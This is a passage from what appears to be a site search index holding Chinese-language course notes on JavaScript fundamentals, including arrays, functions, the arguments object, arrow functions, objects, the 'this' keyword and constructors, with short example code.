arrayN)</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u65b0 array\uff0c\u7531\u8be5 array \u4e0e\u5176\u4ed6 array(\u548c/\u6216\u503c)\u8fde\u63a5\u800c\u6210\u3002</li> <li><code>slice(beginIndex, endIndex)</code>\uff1a\u5c06 array \u7684\u4e00\u90e8\u5206\u7684\u6d45\u62f7\u8d1d\u8fd4\u56de\u5230\u4e00\u4e2a\u65b0\u7684 array \u5bf9\u8c61\u4e2d\u3002</li> <li><code>splice(startIndex, deleteCount, item1, ..., itemN)</code>\uff1a\u901a\u8fc7\u5220\u9664\u6216\u66ff\u6362\u73b0\u6709\u5143\u7d20\u548c/\u6216\u5c31\u5730\u6dfb\u52a0\u65b0\u5143\u7d20\u6765\u66f4\u6539 array \u7684\u5185\u5bb9\u3002</li> <li><code>delete array[index]</code>\uff1a\u901a\u8fc7\u5c06\u5176\u503c\u8bbe\u7f6e\u4e3a undefined \u4ece array \u4e2d\u5220\u9664\u5143\u7d20\uff08\u7559\u4e0b\u4e00\u4e2a\u7a7a\u69fd\uff09\u3002\u8fd9\u4e0d\u4f1a\u66f4\u6539 array \u7684\u957f\u5ea6\u6216\u91cd\u65b0\u7d22\u5f15\u540e\u7eed\u5143\u7d20\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#45-associative-arrays-objects","title":"4.5 Associative Arrays - \u5373 Objects","text":"<p>\u4e2d\u7684\u672f\u8bed\u201cassociative array\u201d\u901a\u5e38\u6307\u5c06 objects \u7528\u4f5c\u952e\u503c\u5b58\u50a8\uff0c\u5176\u4e2d\u5b57\u7b26\u4e32\u503c\uff08\u5c5e\u6027\u540d\uff09\u7528\u4f5c\u201c\u7d22\u5f15\u201d\u800c\u4e0d\u662f\u6570\u5b57\u3002</p> <pre><code>let arr = {}; // \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\narr[\"name\"] = \"Bob\"; // \u5c06\u503c \"Bob\" \u5206\u914d\u7ed9\u952e \"name\"\n// arr.name \u5728\u8fd9\u91cc\u4e5f\u6709\u6548\u3002\n</code></pre> <p>\u8fd9\u4e9b\u4ece\u6839\u672c\u4e0a\u8bf4\u662f objects\u3002</p>"},{"location":"cs/mern/3403/w4/#5-functions","title":"5. Functions","text":"<p>\u51fd\u6570\u662f\u4e2d\u7684\u57fa\u672c\u6784\u5efa\u5757\uff0c\u5141\u8bb8\u4ee3\u7801\u91cd\u7528\u548c\u8fc7\u7a0b\u62bd\u8c61\u3002\u5b83\u4eec\u4e5f\u662f first-class objects\u3002</p>"},{"location":"cs/mern/3403/w4/#51-defining-a-javascript-function","title":"5.1 \u5b9a\u4e49\u51fd\u6570 (Defining a JavaScript Function)","text":"<ul> <li> <p>Syntax\uff1a</p> <pre><code>function &lt;name&gt;(&lt;param1&gt;, &lt;param2&gt;, ...) {\n    // &lt;statement1&gt;\n    // ...\n    return &lt;value&gt;; // \u53ef\u9009\u7684 return \u8bed\u53e5\n}\n</code></pre> <p>\u4f7f\u7528 <code>function</code> \u5173\u952e\u5b57\u3002\u53c2\u6570\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\u7684\u7c7b\u578b\u3002\u5982\u679c\u7701\u7565 <code>return</code> \u8bed\u53e5\uff0c\u6216\u4f7f\u7528 <code>return;</code> \u800c\u6ca1\u6709\u503c\uff0c\u5219\u51fd\u6570\u8fd4\u56de undefined\u3002</p> </li> </ul> <ul> <li>Placement\uff1a\u51fd\u6570\u901a\u5e38\u5fc5\u987b\u5728\u8c03\u7528\u4e4b\u524d\u5b9a\u4e49\u3002</li> </ul> <ul> <li> <p>\u793a\u4f8b\uff1a</p> <pre><code>&lt;body&gt;&lt;h2&gt;JavaScript Functions&lt;/h2&gt;&lt;p id=\"demo\"&gt;&lt;/p&gt;&lt;script&gt;\nfunction myFunction(p1, p2) {\n  return p1 * p2;\n}\ndocument.getElementById(\"demo\").innerHTML = myFunction(4, 3); // \u8c03\u7528\u51fd\u6570\u5e76\u663e\u793a 12\n&lt;/script&gt;&lt;/body&gt;\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#52-calling-a-javascript-function","title":"5.2 \u8c03\u7528\u51fd\u6570 (Calling a JavaScript Function)","text":"<ul> <li> <p>Parameter Passing\uff1a</p> <ul> <li> <p>Primitive Types (Call by Value)\uff1a\u5f53\u57fa\u672c\u7c7b\u578b\u503c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u65f6\uff0c\u5b83\u4eec\u7684\u503c\u4f1a\u88ab\u590d\u5236\u3002\u51fd\u6570\u5185\u90e8\u5bf9\u53c2\u6570\u7684\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd\u5916\u90e8\u7684\u539f\u59cb\u53d8\u91cf\u3002</p> <pre><code>function run(x) {\n    x += 1;\n    return x;\n}\nlet u = 1;\nlet v = run(u);\n// \u6b64\u5904\uff0cu \u4ecd\u4e3a 1\uff0cv \u4e3a 2\n</code></pre> </li> </ul> <ul> <li> <p>Object Types (Call by Sharing/Reference)\uff1a\u5f53\u5bf9\u8c61\uff08\u5305\u62ec arrays \u548c functions\uff09\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u65f6\uff0c\u4f20\u9012\u7684\u662f\u5bf9\u539f\u59cb\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u51fd\u6570\u53ef\u4ee5\u4fee\u6539\u539f\u59cb\u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u4f46\u662f\uff0c\u5982\u679c\u51fd\u6570\u5185\u90e8\u7684\u53c2\u6570\u672c\u8eab\u88ab\u91cd\u65b0\u8d4b\u503c\u7ed9\u4e00\u4e2a \u65b0 \u5bf9\u8c61\uff0c\u5219\u6b64\u91cd\u65b0\u8d4b\u503c\u4e0d\u4f1a\u5f71\u54cd\u5916\u90e8\u7684\u539f\u59cb\u53d8\u91cf\u3002</p> <pre><code>function setOutOnAdventure(party1) { // party1 \u662f\u4e00\u4e2a\u6570\u7ec4\n    party1.push(\"Ivan\"); // \u4fee\u6539\u539f\u59cb\u6570\u7ec4\n    party1.push(\"Mia\");  // \u4fee\u6539\u539f\u59cb\u6570\u7ec4\n\n    let party2 = [\"Felix\", \"Jenna\", \"Sheba\"]; // \u4e00\u4e2a\u65b0\u7684\u5c40\u90e8\u6570\u7ec4\n    party1 = party2; // \u51fd\u6570\u5185\u90e8\u7684 'party1' \u73b0\u5728\u6307\u5411 'party2'\u3002\u8fd9\u4e0d\u4f1a\u6539\u53d8\u4f20\u5165\u7684\u539f\u59cb 'party1' \u6570\u7ec4\u3002\n    party1.push(\"Piers\"); // \u4fee\u6539\u5c40\u90e8\u7684 'party2'\n    return party1; // \u8fd4\u56de\u5c40\u90e8\u7684 'party1'\n}\nlet myParty = [\"Isaac\", \"Garet\"];\nlet adventureParty = setOutOnAdventure(myParty);\nconsole.log(myParty);        // \u8f93\u51fa: [\"Isaac\", \"Garet\", \"Ivan\", \"Mia\"] (\u539f\u59cb\u6570\u7ec4\u88ab\u4fee\u6539)\nconsole.log(adventureParty); // \u8f93\u51fa: [\"Felix\", \"Jenna\", \"Sheba\", \"Piers\"] (\u8fd4\u56de\u65b0\u6570\u7ec4)\n</code></pre> <p>\u51fd\u6570\u53ef\u4ee5\u5bf9\u5176\u4f20\u9012\u7684\u5bf9\u8c61\u4ea7\u751f side effects\u3002</p> </li> </ul> </li> </ul> <ul> <li> <p>Parameter Laxity - Banana Skin\uff1a</p> <ul> <li>Formal Parameters\uff1a\u51fd\u6570\u5b9a\u4e49\u4e2d\u547d\u540d\u7684\u53c2\u6570\u3002</li> <li>Actual Parameters\uff1a\u8c03\u7528\u51fd\u6570\u65f6\u63d0\u4f9b\u7684\u53c2\u6570\u3002</li> <li>Too Few Arguments\uff1a\u5982\u679c\u4f20\u9012\u7684\u53c2\u6570\u5c11\u4e8e\u5f62\u53c2\uff0c\u5219\u51fd\u6570\u5185\u90e8\u7f3a\u5931\u7684\u53c2\u6570\u5c06\u5177\u6709\u503c undefined\u3002</li> <li>Too Many Arguments\uff1a\u5982\u679c\u4f20\u9012\u7684\u53c2\u6570\u591a\u4e8e\u5f62\u53c2\uff0c\u5219\u989d\u5916\u7684\u53c2\u6570\u4e0d\u80fd\u901a\u8fc7\u5176\u5f62\u53c2\u540d\u79f0\u76f4\u63a5\u8bbf\u95ee\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 <code>arguments</code> \u5bf9\u8c61\u8bbf\u95ee\u5b83\u4eec\u3002</li> </ul> </li> </ul> <ul> <li> <p><code>arguments</code> \u5bf9\u8c61\uff1a</p> <ul> <li>\u5728\u4efb\u4f55\u975e\u7bad\u5934 (non-arrow) \u51fd\u6570\u5185\u90e8\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u540d\u4e3a <code>arguments</code> \u7684\u7279\u6b8a array-like \u5bf9\u8c61\u3002</li> </ul> <ul> <li>\u5b83\u5305\u542b\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u6240\u6709 \u5b9e\u53c2\uff0c\u800c\u4e0d\u7ba1\u5b9a\u4e49\u7684\u5f62\u53c2\u6570\u91cf\u5982\u4f55\u3002</li> </ul> <ul> <li> <p>\u793a\u4f8b\uff1a<code>findMax</code> \u51fd\u6570\uff1a</p> <pre><code>function findMax() { // \u672a\u5b9a\u4e49\u5f62\u53c2\n    let max = -Infinity;\n    for (let i = 0; i &lt; arguments.length; i++) { // \u904d\u5386\u6240\u6709\u4f20\u9012\u7684\u53c2\u6570\n        if (arguments[i] &gt; max) {\n            max = arguments[i];\n        }\n    }\n    return max;\n}\nconsole.log(findMax(4, 5, 6, 2, 10)); // \u8f93\u51fa: 10\nconsole.log(findMax(1, 2));          // \u8f93\u51fa: 2\n</code></pre> </li> </ul> </li> </ul>"},{"location":"cs/mern/3403/w4/#53-first-class-objects","title":"5.3 \u51fd\u6570\u4f5c\u4e3a First-Class Objects","text":"<p>\u5728\u4e2d\uff0c\u51fd\u6570\u662f first-class citizens\u3002\u5b83\u4eec\u50cf\u4efb\u4f55\u5176\u4ed6\u5bf9\u8c61\u4e00\u6837\u5bf9\u5f85\uff1a\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u5176\u4ed6\u51fd\u6570\uff0c\u4ece\u51fd\u6570\u8fd4\u56de\uff0c\u5e76\u5177\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <ul> <li>Accessing a Function Definition\uff1a\u5728\u4e0d\u5e26\u5706\u62ec\u53f7 <code>()</code> \u7684\u60c5\u51b5\u4e0b\u5f15\u7528\u51fd\u6570\u540d\u4f1a\u8fd4\u56de\u51fd\u6570\u5bf9\u8c61\u672c\u8eab\u3002</li> </ul> <ul> <li> <p>Assigning Functions to Variables\uff1a</p> <pre><code>function announce() {\n    console.log(\"It's Groundhog day!\");\n}\nlet reannounce = announce; // 'reannounce' \u73b0\u5728\u5f15\u7528\u4e0e 'announce' \u76f8\u540c\u7684\u51fd\u6570\u5bf9\u8c61\nannounce();\nreannounce();\n</code></pre> </li> </ul> <ul> <li>\u4f5c\u4e3a\u5c5e\u6027\u7684\u51fd\u6570 Methods\uff1a\u51fd\u6570\u53ef\u4ee5\u662f\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u88ab\u79f0\u4e3a methods\u3002</li> </ul> <ul> <li> <p>Casting to String\uff1a\u5f53\u51fd\u6570\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u65f6\uff0c\u5176\u6e90\u4ee3\u7801\uff08\u5b9a\u4e49\uff09\u5c06\u4f5c\u4e3a\u6587\u672c\u8fd4\u56de\u3002</p> <ul> <li>Banana Skin\uff1a\u5c06\u51fd\u6570\u6dfb\u52a0\u5230\u5b57\u7b26\u4e32\u5c06\u5bfc\u81f4\u4e0e\u51fd\u6570\u4ee3\u7801\u7684\u5b57\u7b26\u4e32\u8fde\u63a5\uff0c\u800c\u4e0d\u662f\u9519\u8bef\u3002</li> </ul> </li> </ul>"},{"location":"cs/mern/3403/w4/#54-anonymous-functions-arrow-functions","title":"5.4 Anonymous Functions - \u51fd\u6570\u8868\u8fbe\u5f0f \u548c Arrow Functions","text":"<ul> <li> <p>Anonymous Functions\uff1a\u53ef\u4ee5\u5728\u6ca1\u6709\u540d\u79f0\u7684\u60c5\u51b5\u4e0b\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u4e9b\u901a\u5e38\u5728\u9700\u8981\u4e34\u65f6\u4f7f\u7528\u51fd\u6570\u65f6\u4f7f\u7528\uff0c\u4f8b\u5982 callback\u3002</p> <ul> <li> <p>\u793a\u4f8b\uff1a<code>sort()</code> \u65b9\u6cd5\u7684\u6bd4\u8f83\u5668\uff1a<code>Array.prototype.sort()</code> \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53ef\u9009\u7684 comparator function \u4f5c\u4e3a\u53c2\u6570\u6765\u5b9a\u4e49\u6392\u5e8f\u987a\u5e8f\u3002</p> <pre><code>let points = [2, 8, 1, 5, 3, 1];\npoints.sort(); // \u9ed8\u8ba4\u6392\u5e8f\nconsole.log(points); // \u8f93\u51fa: [1, 1, 2, 3, 5, 8] (\u5bf9\u4e8e\u6570\u5b57)\n\n// \u4f7f\u7528\u533f\u540d\u51fd\u6570\u6309\u964d\u5e8f\u6392\u5e8f\npoints.sort(function(a, b) { // \u65e0\u540d\u51fd\u6570\n    return b - a;\n});\nconsole.log(points); // \u8f93\u51fa: [8, 5, 3, 2, 1, 1]\n</code></pre> </li> </ul> </li> </ul> <ul> <li> <p>Arrow Functions - <code>=&gt;</code> (ES6)\uff1a\u4e3a\u7f16\u5199\u533f\u540d\u51fd\u6570\u63d0\u4f9b\u4e86\u66f4\u7b80\u6d01\u7684\u8bed\u6cd5\u3002\u5b83\u4eec\u5728 <code>this</code> keyword \u65b9\u9762\u4e5f\u6709\u4e0d\u540c\u7684\u884c\u4e3a\uff08\u8bcd\u6cd5 <code>this</code>\uff09\u3002</p> <pre><code>points.sort((a, b) =&gt; { return b - a; }); // \u7bad\u5934\u51fd\u6570\u7b49\u6548\u5f62\u5f0f\n// \u5982\u679c\u51fd\u6570\u4f53\u662f\u5355\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5219\u53ef\u4ee5\u7701\u7565\u5927\u62ec\u53f7\u548c 'return'\uff1a\npoints.sort((a, b) =&gt; b - a);\n</code></pre> <p>\u8fd9\u79cd\u5c06\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7684\u80fd\u529b\u975e\u5e38\u5f3a\u5927\uff0c\u7279\u522b\u662f\u5bf9\u4e8e event handling\u3002</p> </li> </ul>"},{"location":"cs/mern/3403/w4/#55-recursive-functions","title":"5.5 Recursive Functions","text":"<p>\u652f\u6301\u9012\u5f52\u51fd\u6570\uff08\u8c03\u7528\u81ea\u8eab\u7684\u51fd\u6570\uff09\u3002</p> <ul> <li> <p>Named Anonymous Functions for Recursion\uff1a\u5982\u679c\u533f\u540d\u51fd\u6570\u9700\u8981\u8c03\u7528\u81ea\u8eab\uff0c\u5219\u5b83\u9700\u8981\u5728\u5176\u81ea\u8eab\u4f5c\u7528\u57df\u5185\u5177\u6709\u7528\u4e8e\u81ea\u5f15\u7528\u7684\u540d\u79f0\u3002</p> <pre><code>var ninja = {\n    yell: function cry(n) { // 'cry' \u662f\u6b64\u533f\u540d\u51fd\u6570\u5185\u90e8\u81ea\u5f15\u7528\u7684\u540d\u79f0\n        return n &gt; 0 ? cry(n - 1) + \"a\" : \"hiy\";\n    }\n};\nconsole.log(ninja.yell(5)); // \u8f93\u51fa: \"hiyaaaaa\"\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#6-objects","title":"6. Objects","text":"<p>\u5bf9\u8c61\u662f\u7684\u6838\u5fc3\u3002\u5b83\u4eec\u662f\u540d\u79f0-\u503c\u5bf9\uff08\u5c5e\u6027\uff09\u7684\u96c6\u5408\u3002</p>"},{"location":"cs/mern/3403/w4/#61-objects","title":"6.1 \u4f5c\u4e3a\u540d\u79f0-\u503c\u5bf9\u7684 Objects","text":"<ul> <li> <p>Structure\uff1a</p> <ul> <li>\u540d\u79f0\uff08keys\uff09\u662f\u5b57\u7b26\u4e32\u3002</li> <li>\u503c\uff08values\uff09\u53ef\u4ee5\u662f\u4efb\u4f55\u503c\uff0c\u5305\u62ec primitives\u3001\u5176\u4ed6 objects \u6216 functions\u3002</li> </ul> </li> </ul> <ul> <li>Analogy\uff1a\u7c7b\u4f3c\u4e8e Java \u4e2d\u7684 <code>HashMap&lt;String, Object&gt;</code> \u6216 Python \u4e2d\u7684 <code>dict</code>\u3002</li> </ul> <ul> <li> <p>Object Literals - <code>{...}</code>\uff1a\u521b\u5efa objects \u6700\u5feb\u3001\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u3002</p> <pre><code>let bubbleTea = {\n    ingredients: [\"Tea\", \"Milk\", \"Tapioca\", \"Honey\"], // \u503c\u662f\u4e00\u4e2a\u6570\u7ec4\n    taste: \"Delicious\",                             // \u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\n    timeToDrinkInSeconds: function() {                // \u503c\u662f\u4e00\u4e2a\u51fd\u6570 (\u65b9\u6cd5)\n        return 41;\n    }\n};\n</code></pre> </li> </ul> <ul> <li>Everything Non-Primitive is an Object\uff1a\u5982\u679c\u53d8\u91cf\u4e0d\u662f primitive\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a object\u3002\u8fd9\u610f\u5473\u7740 arrays \u548c functions \u4ece\u6839\u672c\u4e0a\u8bf4\u4e5f\u662f\u5177\u6709\u7279\u6b8a\u7279\u5f81\u7684 objects\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#62-object-properties","title":"6.2 \u8bbf\u95ee\u548c\u4fee\u6539 Object Properties","text":"<ul> <li> <p>Dot Notation\uff1a\u8bbf\u95ee\u5c5e\u6027\u7684\u6807\u51c6\u65b9\u6cd5\uff1a<code>objectName.propertyName</code>\u3002</p> <pre><code>bubbleTea.taste = \"Sublime\"; // \u4fee\u6539 'taste' \u5c5e\u6027\n</code></pre> </li> </ul> <ul> <li> <p>Bracket Notation - \u7c7b\u6570\u7ec4\uff1a\u4e5f\u53ef\u4ee5\u4f7f\u7528\u65b9\u62ec\u53f7\u548c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u7684\u5c5e\u6027\u540d\u6765\u8bbf\u95ee\u5c5e\u6027\uff1a<code>objectName[\"propertyName\"]</code>\u3002</p> <pre><code>bubbleTea[\"taste\"] = \"Sublime\"; // \u7b49\u6548\u4e8e\u70b9\u8868\u793a\u6cd5\u793a\u4f8b\n</code></pre> </li> </ul> <ul> <li> <p>Advantages of Bracket Notation\uff1a</p> <ul> <li> <p>Dynamic Property Names\uff1a\u5c5e\u6027\u540d\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u8ba1\u7b97\u3002</p> <pre><code>let myProperty = \"ingredients\";\nconsole.log(bubbleTea[myProperty]); // \u8bbf\u95ee bubbleTea.ingredients\n</code></pre> </li> </ul> <ul> <li>Reserved Words as Property Names\uff1a\u53ef\u7528\u4e8e\u8bbe\u7f6e\u6216\u83b7\u53d6\u540d\u79f0\u4e3a\u4fdd\u7559\u5173\u952e\u5b57\u7684\u5c5e\u6027\u3002</li> </ul> </li> </ul> <ul> <li>Methods\uff1a\u4f5c\u4e3a\u5bf9\u8c61\u5c5e\u6027\u7684\u51fd\u6570\u79f0\u4e3a methods\u3002</li> </ul> <ul> <li> <p>Updating Methods at Runtime\uff1a\u7531\u4e8e\u51fd\u6570\u662f first-class objects\uff0c\u800c\u65b9\u6cd5\u53ea\u662f\u4fdd\u5b58\u51fd\u6570\u7684\u5c5e\u6027\uff0c\u56e0\u6b64\u4f60\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u901a\u8fc7\u5c06\u65b0\u51fd\u6570\u5206\u914d\u7ed9\u5c5e\u6027\u6765\u66f4\u6539\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002\u8fd9\u79cd\u52a8\u6001\u7279\u6027\u5141\u8bb8\u5bf9\u5bf9\u8c61\u8fdb\u884c\u201chot patching\u201d\u6216\u4fee\u6539\u884c\u4e3a\u3002</p> <pre><code>bubbleTea.timeToDrinkInSeconds = function() {\n    return \"Far too quick\"; // \u66f4\u6539\u65b9\u6cd5\u7684\u884c\u4e3a\u548c\u8fd4\u56de\u7c7b\u578b\n};\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#63-dynamic-nature","title":"6.3 \u5bf9\u8c61\u7684 Dynamic Nature","text":"<p>\u7531\u4e8e\u5bf9\u8c61\u662f\u540d\u79f0-\u503c\u5bf9\u7684\u96c6\u5408\uff0c\u56e0\u6b64\u5176\u7ed3\u6784\u4e0d\u662f\u56fa\u5b9a\u7684\uff1a</p> <ul> <li> <p>Adding New Properties\uff1a\u4f60\u53ef\u4ee5\u5728\u521b\u5efa\u5bf9\u8c61\u540e\u7684\u4efb\u4f55\u65f6\u95f4\u5411\u5176\u6dfb\u52a0\u65b0\u5c5e\u6027\u3002</p> <pre><code>let team = {};\nteam.attacker = \"Cloud\";\nteam.tank = \"Barret\";\nteam.healer = \"Aerith\"; // \u52a8\u6001\u6dfb\u52a0\u7684\u5c5e\u6027\n</code></pre> </li> </ul> <ul> <li> <p>Deleting Properties\uff1a<code>delete</code> \u8fd0\u7b97\u7b26\u53ef\u4ee5\u4ece\u5bf9\u8c61\u4e2d\u5220\u9664\u5c5e\u6027\u3002</p> <pre><code>delete team.healer; // \u5220\u9664 'healer' \u5c5e\u6027\n</code></pre> </li> </ul> <ul> <li> <p>\u904d\u5386\u5c5e\u6027 (<code>for...in</code> \u5faa\u73af)\uff1a\u4f60\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\u7684\u53ef\u679a\u4e3e\u5c5e\u6027\u540d\u3002</p> <pre><code>for (let role in team) { // 'role' \u5c06\u662f \"attacker\"\uff0c\u7136\u540e\u662f \"tank\"\n    console.log(role + \": \" + team[role]); // \u4f7f\u7528 team[role] \u8bbf\u95ee\u5c5e\u6027\u503c\n}\n// \u8f93\u51fa:\n// attacker: Cloud\n// tank: Barret\n</code></pre> <p>\uff08\u73b0\u4ee3\u5f15\u64ce\u901a\u5e38\u5bf9\u975e\u6574\u6570\u952e\u6309\u63d2\u5165\u987a\u5e8f\u8fed\u4ee3\uff09\u3002</p> </li> </ul>"},{"location":"cs/mern/3403/w4/#64-the-global-object","title":"6.4 The Global Object","text":"<p>\u73af\u5883\u6709\u4e00\u4e2a\u53ef\u4ece\u4ee3\u7801\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u8bbf\u95ee\u7684 global object\u3002</p> <ul> <li> <p>Names\uff1a</p> <ul> <li>\u5728\u6d4f\u89c8\u5668\u4e2d\uff1a<code>window</code>\u3002</li> <li>\u5728 NodeJS \u548c\u5176\u4ed6\u73af\u5883\u4e2d\uff08\u66f4\u5177\u53ef\u79fb\u690d\u6027\uff09\uff1a<code>globalThis</code>\u3002</li> </ul> </li> </ul> <ul> <li> <p>Implicit Global Variables\uff1a\u5728\u9876\u5c42\u58f0\u660e\u7684\u672a\u4f7f\u7528 <code>let</code> \u6216 <code>const</code> \u7684\u53d8\u91cf\u5c06\u6210\u4e3a global object \u7684\u5c5e\u6027\u3002</p> <pre><code>globalThis.x = 5; // \u663e\u5f0f\u521b\u5efa\u5168\u5c40\u5c5e\u6027\nalert(x); // \u9690\u5f0f\u8bbf\u95ee globalThis.x\n</code></pre> </li> </ul> <ul> <li>Caution\uff1a\u901a\u5e38\u4e0d\u9f13\u52b1\u8fc7\u5ea6\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#65-this","title":"6.5 this \u5173\u952e\u5b57","text":"<p><code>this</code> keyword \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6807\u8bc6\u7b26\uff0c\u5176\u503c\u7531\u51fd\u6570\u7684\u8c03\u7528\u65b9\u5f0f\uff08\u5176 execution context\uff09\u786e\u5b9a\u3002</p> <ul> <li> <p>Common Contexts\uff1a</p> <ul> <li> <p>In a Method\uff1a\u5f53\u51fd\u6570\u4f5c\u4e3a\u5bf9\u8c61\u7684\u65b9\u6cd5 (<code>object.method()</code>) \u8c03\u7528\u65f6\uff0c<code>this</code> \u6307\u5411\u8c03\u7528\u8be5\u65b9\u6cd5\u7684\u5bf9\u8c61\uff08\u201cowner object\u201d\uff09\u3002</p> <pre><code>let amberPearlLatte = {\n    basePrice: 10,\n    getPrice: function() {\n        let tax = 1.25;\n        return this.basePrice * tax; // 'this' \u6307\u5411 amberPearlLatte\n    }\n};\nconsole.log(amberPearlLatte.getPrice()); // \u8f93\u51fa: 12.5\n</code></pre> </li> </ul> <ul> <li>Outside any Function, Top Level\uff1a<code>this</code> \u6307\u5411 global object (<code>window</code> \u6216 <code>globalThis</code>)\u3002</li> </ul> <ul> <li> <p>\u5728\u5e38\u89c4\u51fd\u6570\u4e2d (Not a Method, Not Arrow Function)\uff1a</p> <ul> <li>Non-Strict Mode\uff1a<code>this</code> \u4e5f\u6307\u5411 global object\u3002</li> <li>Strict Mode - <code>\"use strict\";</code>\uff1a\u5728\u76f4\u63a5\u8c03\u7528\u7684\u5e38\u89c4\u51fd\u6570\u4e2d\uff0c<code>this</code> \u662f <code>undefined</code>\u3002</li> </ul> </li> </ul> <ul> <li>In an Event Handler\uff1a<code>this</code> \u901a\u5e38\u6307\u63a5\u6536\u5230 event \u7684 HTML \u5143\u7d20\u3002</li> </ul> <ul> <li>Arrow Functions\uff1a\u7bad\u5934\u51fd\u6570\u6ca1\u6709\u81ea\u5df1\u7684 <code>this</code> binding\u3002\u5b83\u4eec\u5728\u5b9a\u4e49\u65f6\u4ece\u5176\u5468\u56f4\uff08\u8bcd\u6cd5 - lexical) \u4f5c\u7528\u57df\u7ee7\u627f <code>this</code>\u3002</li> </ul> </li> </ul> <ul> <li><code>call()</code>\u3001<code>apply()</code>\u3001<code>bind()</code>\uff1a\u8fd9\u4e9b\u65b9\u6cd5\u53ef\u7528\u4e8e\u5728\u8c03\u7528\u51fd\u6570\u65f6\u663e\u5f0f\u8bbe\u7f6e <code>this</code> \u7684\u503c\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#66-constructors-new","title":"6.6 Constructors \u548c new \u5173\u952e\u5b57","text":"<p>\u5f53\u4f60\u9700\u8981\u521b\u5efa\u591a\u4e2a\u5177\u6709\u76f8\u4f3c\u7ed3\u6784\u548c\u884c\u4e3a\u7684\u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 constructor functions\u3002</p> <ul> <li> <p>Constructor Functions\uff1a\u4e0e <code>new</code> keyword \u4e00\u8d77\u4f7f\u7528\u4ee5\u521b\u5efa\u548c\u521d\u59cb\u5316\u5bf9\u8c61\u7684\u5e38\u89c4\u51fd\u6570\u3002</p> <ul> <li>\u6309\u7167\u7ea6\u5b9a\uff0c\u5b83\u4eec\u7684\u540d\u79f0\u5927\u5199\uff08\u4f8b\u5982\uff0c<code>Drink</code>\uff09\u3002</li> </ul> <ul> <li>\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c<code>this</code> \u6307\u5411\u6b63\u5728\u521b\u5efa\u7684\u65b0\u5bf9\u8c61\u3002</li> </ul> <ul> <li> <p>\u793a\u4f8b\uff1a</p> <pre><code>function Drink(basePrice) { // \u6784\u9020\u51fd\u6570\n    this.basePrice = basePrice; // \u5728\u65b0\u5bf9\u8c61\u4e0a\u521d\u59cb\u5316\u5c5e\u6027\n    this.getPrice = function() { // \u4e3a\u65b0\u5bf9\u8c61\u5206\u914d\u4e00\u4e2a\u65b9\u6cd5\n        let tax = 1.125; // \u793a\u4f8b\u7a0e\u7387\n        return this.basePrice * tax;\n    };\n}\n</code></pre> </li> </ul> </li> </ul> <ul> <li> <p><code>new</code> \u5173\u952e\u5b57\uff1a\u5f53\u6267\u884c <code>new ConstructorFunction(...)</code> \u65f6\uff1a</p> <ol> <li>\u521b\u5efa\u4e00\u4e2a\u5168\u65b0\u7684\u7a7a\u5bf9\u8c61\u3002</li> <li>\u6b64\u65b0\u5bf9\u8c61\u7684 <code>prototype</code> \u8bbe\u7f6e\u4e3a <code>ConstructorFunction.prototype</code>\u3002</li> <li>\u4f7f\u7528\u6307\u5b9a\u7684\u53c2\u6570\u8c03\u7528 <code>ConstructorFunction</code>\uff0c\u5e76\u5c06 <code>this</code> \u7ed1\u5b9a\u5230\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002</li> <li>\u5982\u679c\u6784\u9020\u51fd\u6570\u6ca1\u6709\u663e\u5f0f <code>return</code> \u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u5c06\u81ea\u52a8\u4f5c\u4e3a <code>new</code> \u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u8fd4\u56de\u3002</li> </ol> </li> </ul> <ul> <li> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>let amberPearlLatte = new Drink(10); // \u521b\u5efa\u4e00\u4e2a Drink \u5bf9\u8c61\nlet winterMelonTea = new Drink(11);  // \u521b\u5efa\u53e6\u4e00\u4e2a Drink \u5bf9\u8c61\nconsole.log(amberPearlLatte.getPrice()); // \u8c03\u7528\u6b64\u5b9e\u4f8b\u4e0a\u7684 getPrice \u65b9\u6cd5\n</code></pre> </li> 